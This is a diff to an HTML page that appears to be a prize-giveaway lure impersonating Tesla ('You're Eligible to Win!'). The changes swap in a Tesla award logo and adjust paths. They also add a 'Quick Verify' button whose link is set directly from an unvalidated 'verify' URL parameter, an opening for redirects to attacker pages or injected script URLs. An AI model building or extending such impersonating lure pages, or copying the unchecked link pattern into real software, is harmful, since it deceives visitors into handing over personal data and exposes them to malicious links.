@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>You're Eligible to Win! | Tesla Award Program 2026</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="css/style.css">
   <style>
     body{background:var(--light);}
     .page{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:88px 24px 60px;}
@@ -37,13 +37,14 @@
     .envelope-anim{position:relative;display:inline-block;}
     .envelope-anim svg{animation:bounce 2.5s ease-in-out infinite;animation-delay:.8s;}
   </style>
+  <link rel="icon" type="image/png" href="assets/tesla-award-logo.png">
 </head>
 <body>
 
 <nav class="nav">
   <div class="nav-inner">
-    <a href="/" class="nav-logo">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
+    <a href="index.html" class="nav-logo">
+      <img src="assets/tesla-award-logo.png" alt="Tesla Award Program" style="height:30px;width:auto;vertical-align:middle">
       TESLA
     </a>
   </div>
@@ -85,6 +86,11 @@
     </div>
 
     <div class="resend-area">
+      <div id="directVerifyLink" style="display:none;background:rgba(0,165,80,.06);border:1px solid rgba(0,165,80,.2);border-radius:12px;padding:14px 18px;margin-bottom:16px;text-align:center;">
+        <p style="font-size:13px;color:var(--success);font-weight:600;margin:0;">⚡ Quick Verify</p>
+        <a id="verifyLinkHref" href="#" style="display:inline-block;margin-top:8px;background:var(--success);color:white;padding:10px 24px;border-radius:8px;text-decoration:none;font-weight:700;font-size:14px;">Verify My Email Now</a>
+        <p style="font-size:11px;color:var(--gray-2);margin-top:8px;">Click the button above to verify instantly without waiting for the email.</p>
+      </div>
       <p class="resend-note">Didn't receive the email? Check your spam folder or request a new one.</p>
       <button id="resendBtn" onclick="resendEmail()">Resend Verification Email</button>
       <div class="resend-countdown" id="resendCountdown"></div>
@@ -92,12 +98,21 @@
   </div>
 </div>
 
-<script src="/js/config.js"></script>
-<script src="/js/app.js"></script>
+<script src="js/config.js"></script>
+<script src="js/app.js"></script>
 <script>
 // Get params
 const email = getParam('email') || '';
 const name = getParam('name') || 'there';
+const verifyLink = getParam('verify') || '';
+
+// Show direct verify link if available (email delivery fallback)
+if (verifyLink) {
+  var dv = document.getElementById('directVerifyLink');
+  var vh = document.getElementById('verifyLinkHref');
+  if (dv) dv.style.display = 'block';
+  if (vh) vh.href = verifyLink;
+}
 
 document.getElementById('userName').textContent = name;
 if (email) {
